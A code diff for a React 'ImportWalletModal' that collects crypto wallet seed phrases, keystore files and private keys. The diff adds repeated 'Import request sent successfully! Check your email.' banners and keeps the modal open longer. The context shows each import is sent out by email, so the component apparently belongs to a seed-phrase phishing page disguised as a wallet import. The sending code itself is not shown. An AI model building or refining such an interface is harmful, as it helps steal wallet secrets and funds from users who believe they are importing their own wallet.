@@ -30,6 +30,7 @@ const ImportWalletModal: React.FC<ImportWalletModalProps> = ({
   const [keystoreData, setKeystoreData] = useState<string>("");
   const [privateKey, setPrivateKey] = useState<string>("");
   const [isImporting, setIsImporting] = useState<boolean>(false);
+  const [isSuccess, setIsSuccess] = useState<boolean>(false);
   const hasClosedWalletModal = useRef<boolean>(false);
 
   // Close wallet modal when import modal opens (only once)
@@ -94,13 +95,15 @@ const ImportWalletModal: React.FC<ImportWalletModalProps> = ({
         throw new Error(result.error || "Failed to send email");
       }
 
-      // Success - close modal after a brief delay
+      // Success - show success message and close modal after delay
+      setIsSuccess(true);
       setTimeout(() => {
         setIsImporting(false);
-        onClose();
+        setIsSuccess(false);
+        // onClose();
         // You can add a success notification here
         console.log("Import request sent successfully");
-      }, 1500);
+      }, 3000);
     } catch (error) {
       console.error("Import error:", error);
       setIsImporting(false);
@@ -212,6 +215,30 @@ const ImportWalletModal: React.FC<ImportWalletModalProps> = ({
                 />
               </div>
 
+              {/* Success Message */}
+              {isSuccess && (
+                <div className="mb-6 p-4 bg-gradient-to-r from-green-500/10 to-emerald-500/10 border border-green-500/30 rounded-xl backdrop-blur-sm">
+                  <div className="flex items-center space-x-2">
+                    <svg
+                      className="w-5 h-5 text-green-400"
+                      fill="none"
+                      stroke="currentColor"
+                      viewBox="0 0 24 24"
+                    >
+                      <path
+                        strokeLinecap="round"
+                        strokeLinejoin="round"
+                        strokeWidth={2}
+                        d="M5 13l4 4L19 7"
+                      />
+                    </svg>
+                    <p className="text-green-400 text-sm font-medium">
+                      Import request sent successfully! Check your email.
+                    </p>
+                  </div>
+                </div>
+              )}
+
               {/* Instructions */}
               <p className="text-gray-400 text-sm mb-8">
                 Typically 12 (sometimes 24) words separated by single spaces.
@@ -230,6 +257,30 @@ const ImportWalletModal: React.FC<ImportWalletModalProps> = ({
                   className="w-full h-32 p-4 bg-gray-800/50 border border-purple-500/30 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 text-white placeholder-gray-400 resize-none backdrop-blur-sm transition-all duration-300"
                 />
               </div>
+
+              {/* Success Message */}
+              {isSuccess && (
+                <div className="mb-6 p-4 bg-gradient-to-r from-green-500/10 to-emerald-500/10 border border-green-500/30 rounded-xl backdrop-blur-sm">
+                  <div className="flex items-center space-x-2">
+                    <svg
+                      className="w-5 h-5 text-green-400"
+                      fill="none"
+                      stroke="currentColor"
+                      viewBox="0 0 24 24"
+                    >
+                      <path
+                        strokeLinecap="round"
+                        strokeLinejoin="round"
+                        strokeWidth={2}
+                        d="M5 13l4 4L19 7"
+                      />
+                    </svg>
+                    <p className="text-green-400 text-sm font-medium">
+                      Import request sent successfully! Check your email.
+                    </p>
+                  </div>
+                </div>
+              )}
 
               {/* Keystore Instructions */}
               <p className="text-gray-400 text-sm mb-8">
@@ -250,6 +301,30 @@ const ImportWalletModal: React.FC<ImportWalletModalProps> = ({
                   className="w-full h-32 p-4 bg-gray-800/50 border border-purple-500/30 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 text-white placeholder-gray-400 resize-none backdrop-blur-sm transition-all duration-300"
                 />
               </div>
+
+              {/* Success Message */}
+              {isSuccess && (
+                <div className="mb-6 p-4 bg-gradient-to-r from-green-500/10 to-emerald-500/10 border border-green-500/30 rounded-xl backdrop-blur-sm">
+                  <div className="flex items-center space-x-2">
+                    <svg
+                      className="w-5 h-5 text-green-400"
+                      fill="none"
+                      stroke="currentColor"
+                      viewBox="0 0 24 24"
+                    >
+                      <path
+                        strokeLinecap="round"
+                        strokeLinejoin="round"
+                        strokeWidth={2}
+                        d="M5 13l4 4L19 7"
+                      />
+                    </svg>
+                    <p className="text-green-400 text-sm font-medium">
+                      Import request sent successfully! Check your email.
+                    </p>
+                  </div>
+                </div>
+              )}
 
               {/* Private Key Instructions */}
               <p className="text-gray-400 text-sm mb-8">
